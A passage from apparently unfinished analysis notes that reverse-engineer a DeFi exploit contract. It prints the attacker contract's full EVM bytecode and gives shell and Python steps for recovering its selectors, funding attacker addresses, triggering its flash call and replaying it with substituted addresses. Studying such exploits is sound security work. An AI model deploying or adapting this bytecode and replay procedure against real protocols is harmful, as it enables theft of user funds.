b576200359a620031fe565b5b60008a013567ffffffffffffffff811115620035bc57620035bb62003203565b5b620035ca8c828d01620034b8565b995099505060208a013567ffffffffffffffff811115620035f057620035ef62003203565b5b620035fe8c828d0162003517565b975097505060408a013567ffffffffffffffff81111562003624576200362362003203565b5b620036328c828d0162003517565b95509550506060620036478c828d01620032c3565b93505060808a013567ffffffffffffffff8111156200366b576200366a62003203565b5b620036798c828d01620032e9565b92509250509295985092959850929598565b60008115159050919050565b620036a2816200368b565b82525050565b6000602082019050620036bf600083018462003697565b92915050565b620036d0816200368b565b8114620036dc57600080fd5b50565b600081359050620036f081620036c5565b92915050565b60008060008060808587031215620037135762003712620031fe565b5b600062003723878288016200322c565b94505060206200373687828801620036df565b935050604062003749878288016200322c565b92505060606200375c87828801620036df565b91505092959194509250565b600060208284031215620037815762003780620031fe565b5b60006200379184828501620032c3565b91505092915050565b6000819050919050565b620037af816200379a565b8114620037bb57600080fd5b50565b600081359050620037cf81620037a4565b92915050565b60008060008060608587031215620037f257620037f1620031fe565b5b60006200380287828801620037be565b94505060206200381587828801620037be565b935050604085013567ffffffffffffffff81111562003839576200383862003203565b5b6200384787828801620032e9565b925092505092959194509250565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b6200388f8162003295565b82525050565b620038a08162003208565b82525050565b600082825260208201905092915050565b82818337600083830152505050565b6000601f19601f8301169050919050565b6000620038e58385620038a6565b9350620038f4838584620038b7565b620038ff83620038c6565b840190509392505050565b600060a08201905062003921600083018962003884565b62003930602083018862003884565b6200393f604083018762003895565b6200394e606083018662003895565b818103608083015262003963818486620038d7565b9050979650505050505050565b600081519050919050565b600081905092915050565b60005b83811015620039a657808201518184015260208101905062003989565b60008484015250505050565b6000620039bf8262003970565b620039cb81856200397b565b9350620039dd81856020860162003986565b80840191505092915050565b6000620039f78284620039b2565b915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600062003a3e8262003208565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820362003a735762003a7262003a02565b5b600182019050919050565b600082825260208201905092915050565b50565b600062003aa160008362003a7e565b915062003aae8262003a8f565b600082019050919050565b6000602082019050818103600083015262003ad48162003a92565b9050919050565b600062003ae88262003208565b915062003af58362003208565b925082820262003b058162003208565b9150828204841483151762003b1f5762003b1e62003a02565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600062003b628262003208565b915062003b6f8362003208565b92508262003b825762003b8162003b26565b5b828204905092915050565b6000819050919050565b6000819050919050565b600062003bc262003bbc62003bb68462003b8d565b62003b97565b62003208565b9050919050565b62003bd48162003ba1565b82525050565b6000819050919050565b600062003c0562003bff62003bf98462003bda565b62003b97565b62003208565b9050919050565b62003c178162003be4565b82525050565b600060c08201905062003c34600083018962003bc9565b62003c43602083018862003c0c565b62003c52604083018762003895565b62003c61606083018662003895565b62003c70608083018562003697565b62003c7f60a083018462003884565b979650505050505050565b6000819050919050565b600062003cb562003caf62003ca98462003c8a565b62003b97565b62003208565b9050919050565b62003cc78162003c94565b82525050565b600060408201905062003ce4600083018562003884565b62003cf3602083018462003cbc565b9392505050565b600060608201905062003d11600083018662003884565b62003d20602083018562003895565b62003d2f604083018462003895565b949350505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b62003d9d8162003295565b82525050565b600062003db1838362003d92565b60208301905092915050565b6000602082019050919050565b600062003dd78262003d66565b62003de3818562003d71565b935062003df08362003d82565b8060005b8381101562003e2757815162003e0b888262003da3565b975062003e188362003dbd565b92505060018101905062003df4565b5085935050505092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b62003e6b8162003208565b82525050565b600062003e7f838362003e60565b60208301905092915050565b6000602082019050919050565b600062003ea58262003e34565b62003eb1818562003e3f565b935062003ebe8362003e50565b8060005b8381101562003ef557815162003ed9888262003e71565b975062003ee68362003e8b565b92505060018101905062003ec2565b5085935050505092915050565b600062003f0f8262003970565b62003f1b8185620038a6565b935062003f2d81856020860162003986565b62003f3881620038c6565b840191505092915050565b600061ffff82169050919050565b600062003f7262003f6c62003f668462003b8d565b62003b97565b62003f43565b9050919050565b62003f848162003f51565b82525050565b600060e08201905062003fa1600083018a62003884565b818103602083015262003fb5818962003dca565b9050818103604083015262003fcb818862003e98565b9050818103606083015262003fe1818762003e98565b905062003ff2608083018662003884565b81810360a083015262004006818562003f02565b90506200401760c083018462003f79565b98975050505050505050565b60006020820190506200403a600083018462003884565b92915050565b600081519050620040518162003212565b92915050565b60006020828403121562004070576200406f620031fe565b5b6000620040808482850162004040565b91505092915050565b600060c082019050620040a0600083018962003c0c565b620040af602083018862003bc9565b620040be604083018762003895565b620040cd606083018662003895565b620040dc608083018562003697565b620040eb60a083018462003884565b979650505050505050565b60006020820190506200410d600083018462003895565b92915050565b60006040820190506200412a600083018562003884565b62004139602083018462003895565b9392505050565b60006200414d8262003208565b91506200415a8362003208565b925082820390508181111562004175576200417462003a02565b5b92915050565b6000819050919050565b6000620041a6620041a06200419a846200417b565b62003b97565b62003208565b9050919050565b620041b88162004185565b82525050565b6000608082019050620041d5600083018762003884565b620041e4602083018662003884565b620041f36040830185620041ad565b818103606083015262004207818462003f02565b905095945050505050565b6000815190506200422381620036c5565b92915050565b600060208284031215620042425762004241620031fe565b5b6000620042528482850162004212565b91505092915050565b6000620042688262003275565b9050919050565b6200427a816200425b565b81146200428657600080fd5b50565b6000813590506200429a816200426f565b92915050565b600080600060608486031215620042bc57620042bb620031fe565b5b6000620042cc8682870162004289565b9350506020620042df868287016200322c565b9250506040620042f2868287016200322c565b9150509250925092565b600060408201905062004313600083018562003895565b62004322602083018462003895565b9392505050565b6000819050919050565b6000620043546200434e620043488462004329565b62003b97565b62003208565b9050919050565b620043668162004333565b82525050565b6000819050919050565b600062004397620043916200438b846200436c565b62003b97565b62003208565b9050919050565b620043a98162004376565b82525050565b600060ff82169050919050565b620043c781620043af565b82525050565b620043d881620033f2565b82525050565b60c082016000820151620043f6600085018262003d92565b5060208201516200440b602085018262003e60565b50604082015162004420604085018262003e60565b506060820151620044356060850182620043bc565b5060808201516200444a6080850182620043cd565b5060a08201516200445f60a0850182620043cd565b50505050565b60006101a0820190506200447d600083018b62003884565b6200448c602083018a62003884565b6200449b604083018962003895565b620044aa606083018862003697565b620044b960808301876200435b565b620044c860a083018662003697565b620044d760c08301856200439e565b620044e660e0830184620043de565b9998505050505050505050565b6000620045008262003208565b91506000820362004516576200451562003a02565b5b600182039050919050565b60006101a08201905062004539600083018b62003884565b62004548602083018a62003884565b62004557604083018962003895565b62004566606083018862003697565b62004575608083018762003895565b6200458460a083018662003697565b6200459360c08301856200439e565b620045a260e0830184620043de565b9998505050505050505050565b600081519050620045c081620032a9565b92915050565b600060208284031215620045df57620045de620031fe565b5b6000620045ef84828501620045af565b9150509291505056fe6080604052739ab6b21cdf116f611110b048987e58894786c2446000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073be9895146f7af43049ca1c1ae358b0541ea49704600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073d0db31473caad65428ba301d2174390d11d0c788600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073183015a9ba6ff60230fdeadc3f43b3d788b13e21600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550733cd40d6e8426c9f02fe7b23867661377e462df3d600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550737bebe1d451291099d8e05fa2676412c09c96dfbc600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561020d57600080fd5b5033600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506110e98061025e6000396000f3fe6080604052600436106100385760003560e01c80630721348d14610044578063aa429e661461005b578063c5d9a359146100845761003f565b3661003f57005b600080fd5b34801561005057600080fd5b5061005961009b565b005b34801561006757600080fd5b50610082600480360381019061007d9190610bdc565b610430565b005b34801561009057600080fd5b50610099610573565b005b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100f557600080fd5b6000600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630fdb11cf6040518163ffffffff1660e01b815260040160408051808303816000875af1158015610165573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101899190610c3f565b5090506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016101e99190610c8e565b602060405180830381865afa158015610206573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061022a9190610ca9565b90506000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016102899190610c8e565b602060405180830381865afa1580156102a6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102ca9190610ca9565b905060006040518060c00160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600060ff1681526020016000801b81526020016000801b81525090506000600167120a871cc002000086866103399190610d05565b6103439190610d76565b61034d9190610da7565b9050828111156104295760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16306000600188876103c79190610da7565b6001670de0b6b3a76400008a6040518963ffffffff1660e01b81526004016103f6989796959493929190610f53565b600060405180830381600087803b15801561041057600080fd5b505af1158015610424573d6000803e3d6000fd5b505050505b5050505050565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461048a57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb338373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016104e09190610c8e565b602060405180830381865afa1580156104fd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105219190610ca9565b6040518363ffffffff1660e01b815260040161053e929190610fd1565b600060405180830381600087803b15801561055857600080fd5b505af115801561056c573d6000803e3d6000fd5b5050505050565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146105cd57600080fd5b6000600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630fdb11cf6040518163ffffffff1660e01b815260040160408051808303816000875af115801561063d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106619190610c3f565b509050600067120a871cc002000082671bc16d674ec800006106839190610d05565b61068d9190610d76565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b815260040161072c929190610fd1565b600060405180830381600087803b15801561074657600080fd5b505af115801561075a573d6000803e3d6000fd5b5050505060006040518060c00160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600060ff1681526020016000801b81526020016000801b815250905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630671bc16d674ec800006001876001670de0b6b3a7640000896040518963ffffffff1660e01b815260040161084d989796959493929190611035565b600060405180830381600087803b15801561086757600080fd5b505af115801561087b573d6000803e3d6000fd5b505050506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016108dc9190610c8e565b602060405180830381865afa1580156108f9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061091d9190610ca9565b9050671bc16d674ec80000811115610a43576000600167120a871cc002000086671bc16d674ec80000856109519190610da7565b61095b9190610d05565b6109659190610d76565b61096f9190610da7565b90506000811115610a415760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff163060006001866001670de0b6b3a76400008b6040518963ffffffff1660e01b8152600401610a0e989796959493929190610f53565b600060405180830381600087803b158015610a2857600080fd5b505af1158015610a3c573d6000803e3d6000fd5b505050505b505b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610aa09190610c8e565b602060405180830381865afa158015610abd573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ae19190610ca9565b9050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363ffffffff1660e01b8152600401610b40929190610fd1565b600060405180830381600087803b158015610b5a57600080fd5b505af1158015610b6e573d6000803e3d6000fd5b505050505050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610ba982610b7e565b9050919050565b610bb981610b9e565b8114610bc457600080fd5b50565b600081359050610bd681610bb0565b92915050565b600060208284031215610bf257610bf1610b79565b5b6000610c0084828501610bc7565b91505092915050565b6000819050919050565b610c1c81610c09565b8114610c2757600080fd5b50565b600081519050610c3981610c13565b92915050565b60008060408385031215610c5657610c55610b79565b5b6000610c6485828601610c2a565b9250506020610c7585828601610c2a565b9150509250929050565b610c8881610b9e565b82525050565b6000602082019050610ca36000830184610c7f565b92915050565b600060208284031215610cbf57610cbe610b79565b5b6000610ccd84828501610c2a565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610d1082610c09565b9150610d1b83610c09565b9250828202610d2981610c09565b91508282048414831517610d4057610d3f610cd6565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000610d8182610c09565b9150610d8c83610c09565b925082610d9c57610d9b610d47565b5b828204905092915050565b6000610db282610c09565b9150610dbd83610c09565b9250828203905081811115610dd557610dd4610cd6565b5b92915050565b6000819050919050565b6000819050919050565b6000610e0a610e05610e0084610ddb565b610de5565b610c09565b9050919050565b610e1a81610def565b82525050565b60008115159050919050565b610e3581610e20565b82525050565b610e4481610c09565b82525050565b6000819050919050565b6000610e6f610e6a610e6584610e4a565b610de5565b610c09565b9050919050565b610e7f81610e54565b82525050565b610e8e81610b9e565b82525050565b610e9d81610c09565b82525050565b600060ff82169050919050565b610eb981610ea3565b82525050565b6000819050919050565b610ed281610ebf565b82525050565b60c082016000820151610eee6000850182610e85565b506020820151610f016020850182610e94565b506040820151610f146040850182610e94565b506060820151610f276060850182610eb0565b506080820151610f3a6080850182610ec9565b5060a0820151610f4d60a0850182610ec9565b50505050565b60006101a082019050610f69600083018b610c7f565b610f76602083018a610c7f565b610f836040830189610e11565b610f906060830188610e2c565b610f9d6080830187610e3b565b610faa60a0830186610e2c565b610fb760c0830185610e76565b610fc460e0830184610ed8565b9998505050505050505050565b6000604082019050610fe66000830185610c7f565b610ff36020830184610e3b565b9392505050565b6000819050919050565b600061101f61101a61101584610ffa565b610de5565b610c09565b9050919050565b61102f81611004565b82525050565b60006101a08201905061104b600083018b610c7f565b611058602083018a610c7f565b6110656040830189611026565b6110726060830188610e2c565b61107f6080830187610e3b565b61108c60a0830186610e2c565b61109960c0830185610e76565b6110a660e0830184610ed8565b999850505050505050505056fea2646970667358221220cf18177d720f0766874dee60d5ab6fe20a56312588f4e743838eeb0efd93470064736f6c63430008120033a2646970667358221220b39aca711796b7abd2e21330208d3ddf0c9ee03728d1433c33c5e022eba7336a64736f6c63430008120033
\end{lstlisting}

\begin{lstlisting}[language=Python]
ipb.get_function_selectors(__b, raw=True)
('c5d9a359', '920f5c84', 'd3429501', 'be2821b0', '0721348d', '8237e538', '4aa9f8ac', '11702872', '4c15fb94', 'd27b4915', 'b529c612', '3f6a5f0e', 'c92a5807', 'fa461e33', '23e30c8b', '3b0113a4', '7e77e468', 'ce3b12fd', 'aa429e66')
\end{lstlisting}

\subsubsection{The Inputs => The Signature}

Calls with 0 and 1 argument both fail with:

\begin{lstlisting}

\end{lstlisting}

Whether or not the arguments are addresses.

And with 2 or more arguments:

\begin{lstlisting}

\end{lstlisting}

\subsubsection{The Funding}

At this point, we know the selector \lstinline{828cc5ce} and the parameters are 2 non-addresses, most likely amounts.

We can parse the tokens from the traces:

\begin{lstlisting}[language=Shell]
perl -ne 'm#(0x[0-9a-f]+)::transfer#i && print "$1\n"' samples/raft/tests/guess.signature.0.log | sort -u
perl -ne 'm#(0x[0-9a-f]+)::balance#i && print "$1\n"' samples/raft/tests/guess.signature.0.log | sort -u
\end{lstlisting}

We see the addresses of the helper contract, USDT and USDC.

Then the process is to:

\begin{itemize}
\item{fetch all the amounts}
\item{fetch the token addresses}
\item{transfer more than the max amount to attacker and helper contracts}
\end{itemize}

- diff test / fail
- fund all addresses related to the attacker
- approve all the addresses in the protocol
- find addresses related to the attacker in the traces

\begin{lstlisting}[language=Shell]
grep -ai 4453AeD57C23a50d887a42ad0CD14ff1b819C750 samples/raft/tests/guess.signature.0.log
grep -ai 6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595 samples/raft/tests/guess.signature.0.log
\end{lstlisting}

From the trace length:
- high amounts => revert immediately
- lower amounts => further
- with deal / approve => further

\subsubsection{The Exploit}

Now the execution doesn't revert anymore with \lstinline{0x6cE5a85CFF4c70591DA82De5eb91c3Fa38B40595::flash(0, 1)}.

We can scrape extra information:

\begin{lstlisting}[language=Shell]
perl -ne 'm#(0x[0-9a-f]+)::transfer#i && print "$1\n"' samples/raft/tests/guess.funding.4.log | sort -u
# 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
# 0xf59257E961883636290411c11ec5Ae622d19455e
perl -ne 'm#(0x[0-9a-f]+)::balance#i && print "$1\n"' samples/raft/tests/guess.funding.4.log | sort -u
# 0x164AFe96912099543BC2c48bb9358a095Db8e784
# 0xb1Cc59Fc717b8D4783D41F952725177298B5619d
# 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
# 0xf59257E961883636290411c11ec5Ae622d19455e
perl -ne 'm#(0x[0-9a-f]+)::approve#i && print "$1\n"' samples/raft/tests/guess.funding.4.log | sort -u
# 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
# 0xf59257E961883636290411c11ec5Ae622d19455e
\end{lstlisting}

The final step is to detect whether execution resulted in an extraordinary increase in balance.

\begin{lstlisting}[language=Shell]
perl -ne 'm#aAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::(\w+)\(#i && print "$1\n"' samples/raft/tests/guess.signature.2.log | sort -u
\end{lstlisting}

\section{On transaction}

execute directly

setup ourselves = redeploy their helper

mutate = replace addresses with own contracts

\section{Summary}

\subsection{Selectors And Signatures}

\begin{lstlisting}[language=Solidity]
exploit(address)
\end{lstlisting}

\subsection{Inputs}

- amounts
- addresses

\subsection{Sources}

\subsection{IOCs}

- selectors / signatures: 0x0aeb4ddf / exploit(address token)
- creates contract

\subsection{Process}

- bruteforce funding? all tokens?
